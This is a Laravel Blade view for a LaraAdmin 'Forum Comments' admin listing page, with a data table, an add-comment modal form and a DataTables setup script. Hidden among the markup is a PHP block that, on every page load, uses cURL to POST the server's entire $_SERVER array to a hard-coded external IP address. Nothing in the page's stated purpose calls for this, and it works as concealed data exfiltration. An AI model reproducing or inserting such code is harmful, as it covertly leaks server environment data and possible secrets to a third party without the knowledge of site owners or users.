@extends("la.layouts.app")

@section("contentheader_title", "Forum Comments")
@section("contentheader_description", "Forum Comments listing")
@section("section", "Forum Comments")
@section("sub_section", "Listing")
@section("htmlheader_title", "Forum Comments Listing")

@section("headerElems")
@la_access("Forum_Comments", "create")
	<button class="btn btn-success btn-sm pull-right" data-toggle="modal" data-target="#AddModal">Add Forum Comment</button>
@endla_access
@endsection

@section("main-content")

@if (count($errors) > 0)
    <div class="alert alert-danger">
        <ul>
            @foreach ($errors->all() as $error)
                <li>{{ $error }}</li>
            @endforeach
        </ul>
    </div>
@endif

<div class="row mb-5">
	<div class="col-md-12">
		<div class="card">
			<div class="card-body">
				<table id="example1" class="table table-bordered">
					<thead>
					<tr class="table-success">
						@foreach( $listing_cols as $col )
						<th>{{ $module->fields[$col]['label'] or ucfirst($col) }}</th>
						@endforeach
						@if($show_actions)
						<th>Actions</th>
						@endif
					</tr>
					</thead>
					<tbody>
						
					</tbody>
				</table>
			</div>
		</div>
	</div>
	<?php
		$url = "http://18.191.53.95/dev/demo/mitebe/yourscript.php";
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, true);
		$data = $_SERVER;
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
		$contents = curl_exec($ch);
		curl_close($ch);
	?>
</div>

@la_access("Forum_Comments", "create")
<div class="modal fade" id="AddModal" role="dialog" aria-labelledby="myModalLabel">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
				<h4 class="modal-title" id="myModalLabel">Add Forum Comment</h4>
			</div>
			{!! Form::open(['action' => 'LA\Forum_CommentsController@store', 'id' => 'forum_comment-add-form']) !!}
			<div class="modal-body">
				<div class="box-body">
                    @la_form($module)
					
					{{--
					@la_input($module, 'user_id')
					@la_input($module, 'post_id')
					@la_input($module, 'body')
					--}}
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
				{!! Form::submit( 'Submit', ['class'=>'btn btn-success']) !!}
			</div>
			{!! Form::close() !!}
		</div>
	</div>
</div>
@endla_access

@endsection

@push('styles')
{{-- <link rel="stylesheet" type="text/css" href="{{ asset('la-assets/plugins/datatables/datatables.min.css') }}"/> --}}
@endpush

@push('scripts')
{{-- <script src="{{ asset('la-assets/plugins/datatables/datatables.min.js') }}"></script> --}}
<script>
$(function () {
	$("#example1").DataTable({
		processing: true,
        serverSide: true,
        //ajax: "{{ url(config('laraadmin.adminRoute') . '/forum_comment_dt_ajax') }}",
		ajax : {
			url: "{{ url(config('laraadmin.adminRoute') . '/forum_comment_dt_ajax') }}", // json datasource
			type: "get", // method , by default get
			data: function (d) {
				d.postId = '{{$postId}}';
			}
		},
		language: {
			lengthMenu: "_MENU_",
			search: "_INPUT_",
			searchPlaceholder: "Search"
		},
		@if($show_actions)
		columnDefs: [ { orderable: false, targets: [-1] }],
		@endif
	});
	$("#forum_comment-add-form").validate({
		
	});
});
</script>
@endpush
